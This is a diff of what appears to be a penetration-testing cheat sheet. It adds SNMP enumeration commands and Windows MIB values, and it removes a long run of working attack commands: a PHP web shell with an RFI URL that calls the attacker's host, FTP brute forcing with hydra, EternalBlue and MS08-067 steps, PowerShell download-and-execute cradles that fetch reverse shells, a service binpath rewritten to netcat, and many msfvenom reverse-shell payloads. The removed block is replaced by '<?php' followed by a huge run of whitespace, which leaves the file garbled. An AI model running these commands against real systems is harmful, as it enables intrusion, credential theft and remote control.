@@ -24,7 +24,11 @@
 
 3. [SMB/Samba](#smbsamba)
 
-4. [Web Servers](#web-servers)
+4. [SNMP](#snmp)
+
+    - [Windows SNMP MIB Values](#windows-snmp-mib-values)
+
+5. [Web Servers](#web-servers)
 
     - [Wordlists](#wordlists)
 
@@ -40,7 +44,7 @@
     
     - [Local File Inclusion / Remote File Inclusion](#local-file-inclusion--remote-file-inclusion-lfi--rfi)
 
-5. [FTP](#ftp)
+6. [FTP](#ftp)
 
     - [Bruteforce](#bruteforce)
 
@@ -48,7 +52,7 @@
 
     - [Upload](#upload)
 
-6. [SMB Exploitation](#smb-exploitation)
+7. [SMB Exploitation](#smb-exploitation)
 
     - [Eternal Blue (MS17-010)](#eternal-blue-ms17-010)
 
@@ -58,13 +62,13 @@
 
         - [Payloads](#payloads)
 
-7. [Linux Privilege Escalation](#linux-privilege-escalation)
+8. [Linux Privilege Escalation](#linux-privilege-escalation)
 
     - [Enumeration Scripts](#enumeration-scripts)
 
     - [SUID Binaries](#suid-binaries)
 
-8. [Windows Privilege Escalations](#windows-privilege-escalation)
+9. [Windows Privilege Escalations](#windows-privilege-escalation)
 
     - [Enumeration Scripts](#enumeration-scripts-1)
 
@@ -80,7 +84,7 @@
 
         - [Windows XP SP0/SP1](#windows-xp-sp0sp1)
 
-9. [MSFvenom Payloads](#msfvenom-payloads)
+10. [MSFvenom Payloads](#msfvenom-payloads)
 
     - [Linux](#linux)
 
@@ -192,6 +196,30 @@ Hit Return 2x
 
 <code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>
 
+## SNMP
+
+<code>snmp-check [IP]</code>
+
+<code>onesixtyone -c SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt [IP]</code>
+
+<code>snmpbulkwalk -c [COMMUNITY_STRING] -v[VERSION] [IP]</code>
+
+### Windows SNMP MIB Values
+
+System Processes: <code>1.3.6.1.2.1.25.1.6.0</code>
+
+Running Programs: <code>1.3.6.1.2.1.25.4.2.1.2</code>
+
+Process Path: <code>1.3.6.1.2.1.25.4.2.1.4</code>
+
+Storage Units: <code>1.3.6.1.2.1.25.2.3.1.4</code>
+
+Software Name: <code>1.3.6.1.2.1.25.6.3.1.2</code>
+
+User Accounts: <code>1.3.6.1.4.1.77.1.2.25</code>
+
+TCP Local Ports: <code>1.3.6.1.2.1.6.13.1.3</code>
+
 ## SMB/Samba
 
 <code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>
@@ -266,240 +294,4 @@ Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-hu
 
 #### RFI
 
-<code><?php echo shell_exec($_GET['cmd']); ?\></code>
-
-Store in a file on local host, navigate to it via the web app and pass commands to it.
-
-<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=http://[LOCAL_IP]/rfi.txt&cmd=[COMMAND]</code>
-
-## FTP 
-
-### Bruteforce
-
-<code>hydra -V -f -L [USER_LIST] -P [PASSWORDS_LIST] ftp://[IP] -u -vV</code>
-
-### Download
-
-<code>ftp [IP]</code>
-
-<code>>PASSIVE</code>
-
-<code>>BINARY</code>
-
-<code>>get [FILE]</code>
-
-### Upload
-
-<code>ftp [IP]</code>
-
-<code>>PASSIVE</code>
-
-<code>>BINARY</code>
-
-<code>>put [FILE]</code>
-
-## SMB Exploitation
-
-### Eternal Blue (MS17-010) 
-
-Use exploit found [here](https://github.com/worawit/MS17-010)
-
-#### Payload
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>
-
-Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>
-
-Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>
-
-Modify them to upload and execute the payload file
-
-Use listener 
-
-<code>nc -lnvp [PORT]</code>
-
-### MS08-067
-
-Use exploit found [here](https://github.com/andyacer/ms08_067)
-
-## PowerShell Privilege Escalation
-
-Both [Nishang](https://github.com/samratashok/nishang) and [Empire](https://github.com/EmpireProject/Empire) have a suite of PowerShell tools.
-
-### MS16-032
-
-Use the Empire [Invoke-MS16-032.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)
-
-Use Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) for reverse shell payload.
-
-Add the following line to the bottom of the Invoke-PowerShellTcp.ps1 script:
-
-<code>Invoke-PowerShellTcp -Reverse -IPAddress [LOCAL_IP] -Port [PORT]</code>
-
-Add the following to the bottom of the Invoke-MS16-032 script:
-
-<code>Invoke-MS16-032 -Command "IEX(New-Object Net.WebClient).DownloadString('[URL]/[REVERSEHLL_PAYLOAD')"</code>
-
-Execute on the host by running the following:
-
-<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]/Invoke-MS16-032.ps1')</code>
-
-#### Payloads
-
-Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>
-
-Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>
-
-Replace shell code in the script 
-
-Execute the script
-
-<code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>
-
-Use listener 
-
-<code>nc -lnvp [PORT]</code>
-
-## Linux Privilege Escalation
-
-### Enumeration Scripts
-
-<code>LinPEAS.sh</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-
-<code>LinEnum.sh</code> Found [here](https://github.com/rebootuser/LinEnum)
-
-### SUID Binaries
-
-- [GTFOBins](https://gtfobins.github.io/)
-
-- [Priv Esc with SUIDs](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
-
-## Windows Privilege Escalation
-
-### Enumeration Scripts
-
-<code>SharUp.exe</code> Found [here](https://github.com/GhostPack/SharpUp)
-
-<code>Sherlock.ps1</code> Found [here](https://github.com/rasta-mouse/Sherlock)
-
-<code>WinPEAS.exe</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
-
-### Juicy Potato
-
-Found [here](https://github.com/ohpe/juicy-potato) ([pre-compile binaries](https://github.com/ohpe/juicy-potato/releases))
-
-#### Vulnerable OS Versions
-
-- Windows 7 Enterprise
-- Windows 8.1 Enterprise
-- Windows 10 Enterprise
-- Windows 10 Professional
-- Windows Server 2008 R2 Enterprise
-- Windows Server 2012 Datacenter
-- Windows Server 2016 Standard
-
-#### Required Permissions
-- <code>SeImpersonate</code>
-- <code>SeAssignPrimaryToken</code>
-
-#### Generating the payload
-
-Windows x64: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
-
-Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
-
-#### Execution
-
-Create the listener to cath the payload
-
-<code>nc -lnvp [PORT]</code>
-
-Run the exploit on the target host.
-
-<code>JuicyPotato.exe -l 1337 -p [DIR\TO\PAYLOAD] -t * -c {CLSID}</code>
-
-### Service Exploitation
-
-#### Windows XP SP0/SP1
-
-Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.
-
-<code>accesschk.exe /accepteula -uwcqv "Autenticated Users" *</code>
-
-Running the following gives more information about the specified service (i.e. what groups have what permissions over it).
-
-<code>accesschk.exe /accepteula -ucqv [SERVICE]</code>
-
-To see the start type, dependencies, and binary path the service uses:
-
-<code>sc qc [SERVICE]</code>
-
-Check the status of the service.
-
-<code>sc query [SERVICE]</code>
-
-If needed, change the start type of the service 
-
-<code>sc config [SERVICE] start= auto</code>
-
-Changing the binary path:
-
-<code>sc config [SERVICE] binpath= [PATH\TO\nc.exe [KALI IP] [PORT] -e C:\WINDOWS\System32\cmd.exe]</code>
-
-Setup the netcat listener and start the service.
-
-Starting / Stopping the Service
-
-<code>net start [SERVICE]</code>
-
-<code>net stop [SERVICE]</code>
-
-## MSFvenom Payloads
-
-### Linux
-
-<code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f elf > shell.elf</code>
-
-### Windows
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
-
-<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
-
-<code>msfvenom -p windows/x82/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
-
-### PHP
-
-<code>msfvenom -p php/reverse_php LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.php</code>
-
-Append <code><?php</code>
-
-### JSP
-
-<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.jsp</code>
-
-### WAR
-
-<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f war > shell.war</code>
-
-### ASP Paylod: 
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>
-
-### ASP.NET Payload: 
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>
-
-### Python
-
-<code>msfvenom -p cmd/unix/reverse_python LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.py</code>
-
-### Bash
-
-<code>msfvenom -p cmd/unix/reverse_bash LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.sh</code>
-
-### Perl
-
-<code>msfvenom -p cmd/unix/reverse_perl LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.pl</code>
+<code><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
